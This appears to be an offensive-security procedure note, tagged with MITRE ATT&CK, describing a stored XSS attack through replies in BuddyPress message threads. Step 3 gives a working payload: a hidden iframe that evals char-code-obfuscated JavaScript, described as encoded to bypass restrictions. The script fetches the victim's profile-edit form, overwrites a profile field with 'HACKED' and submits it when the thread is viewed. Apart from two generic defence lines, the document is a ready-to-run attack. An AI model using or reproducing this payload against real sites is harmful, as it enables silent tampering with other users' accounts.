---
tags:
  - xss
  - stored-xss
  - buddypress
type: procedure
tools: []
tactics:
  - '[[Initial Access]]'
  - '[[Execution]]'
commands:
  - '[[commands/encoded-xss-change-username]]'
platforms:
  - Web
techniques:
  - '[[Exploit Public-Facing Application]]'
  - '[[JavaScript]]'
skill_level: intermediate
impact_level: high
detection_risk: medium
sub_techniques: []
id: c43a2cbb-010d-454a-a4f9-ca9a3209ccc4
created_at: '2025-12-14T00:11:16.601Z'
updated_at: '2025-12-14T00:11:16.601Z'
verified: false
validated: true
submitted: true
mitre_tactics:
  - '[[Initial Access]]'
  - '[[Execution]]'
mitre_techniques:
  - '[[Exploit Public-Facing Application]]'
  - '[[JavaScript]]'
---
# Reply with Malicious Payload in Message Thread

## Summary

This procedure injects a malicious XSS payload into an existing BuddyPress message thread via a reply, exploiting stored XSS for JS execution.

## Description

Similar to new messages, replies are not properly sanitized, allowing stored payloads that trigger on thread view, including previews, for actions like privilege escalation.

## Requirements

1. Existing message thread with target
2. Pre-crafted encoded payload
3. Web access to inbox

## Defense

Defensive measures and detection strategies:

- Implement input sanitization and escaping
- Use content security policy (CSP) to restrict inline scripts

## Objectives

1. Inject payload into ongoing conversation
2. Ensure storage and trigger on view
3. Facilitate arbitrary JS execution

## Instructions

### Step 1: Navigate to Inbox

**Context**: Access existing messages.

Go to the messages inbox in the web interface.

> Locates the target thread.

### Step 2: Open Message Thread

**Context**: View the conversation.

Select and open an existing message thread.

> Prepares for reply composition.

### Step 3: Compose Reply with Payload

**Context**: Insert malicious content.

Reply with the payload using [[commands/encoded-xss-change-username]]:

```html
<iframe src=javascript:eval(String.fromCharCode.apply(null,[108,101,116,32,110,97,109,101,32,61,32,112,97,114,101,110,116,46,66,80,95,78,111,117,118,101,97,117,46,109,101,115,115,97,103,101,115,46,114,111,111,116,85,114,108,46,115,112,108,105,116,40,39,47,39,41,91,50,93,59,10,108,101,116,32,117,114,108,32,61,32,112,97,114,101,110,116,46,108,111,99,97,116,105,111,110,46,111,114,105,103,105,110,32,43,32,39,47,109,101,109,98,101,114,115,47,39,32,43,32,110,97,109,101,32,43,32,39,47,112,114,111,102,105,108,101,47,101,100,105,116,47,103,114,111,117,112,47,49,47,39,59,10,10,112,97,114,101,110,116,46,106,81,117,101,114,121,46,97,106,97,120,40,123,117,114,108,58,32,117,114,108,44,32,116,121,112,101,58,32,39,71,69,84,39,44,32,115,117,99,99,101,115,115,58,32,102,117,110,99,116,105,111,110,40,104,116,109,108,95,114,101,115,112,111,110,115,101,41,32,123,10,32,32,32,32,108,101,116,32,100,111,109,32,61,32,112,97,114,101,110,116,46,106,81,117,101,114,121,40,104,116,109,108,95,114,101,115,112,111,110,115,101,41,59,10,32,32,32,32,100,111,109,46,102,105,110,100,40,39,105,110,112,117,116,91,110,97,109,101,61,34,102,105,101,108,100,95,49,34,93,39,41,46,118,97,108,40,39,72,65,67,75,69,68,39,41,59,10,32,32,32,32,112,97,114,101,110,116,46,106,81,117,101,114,121,46,97,106,97,120,40,123,117,114,108,58,32,100,111,109,46,102,105,110,100,40,39,35,112,114,111,102,105,108,101,45,101,100,105,116,45,102,111,114,109,39,41,46,97,116,116,114,40,39,97,99,116,105,111,110,39,41,44,32,116,121,112,101,58,32,39,80,79,83,84,39,44,32,100,97,116,97,58,32,100,111,109,46,102,105,110,100,40,39,35,112,114,111,102,105,108,101,45,101,100,105,116,45,102,111,114,109,39,41,46,115,101,114,105,97,108,105,122,101,40,41,125,41,10,125,125,41,59,10])) width=0 height=0 style=display:none;></iframe>
```

> Encoded to bypass restrictions.

### Step 4: Submit Reply

**Context**: Store the reply.

Send the reply to add it to the thread.

> Payload now awaits triggering.

## MITRE ATT&CK Mapping

### Tactics

- [[Initial Access]]
- [[Execution]]

### Techniques

- [[Exploit Public-Facing Application]]
- [[JavaScript]]

### Sub-Techniques



## Commands Used

- [[commands/encoded-xss-change-username]]

## Tools Used



## Tags

- xss
- buddypress
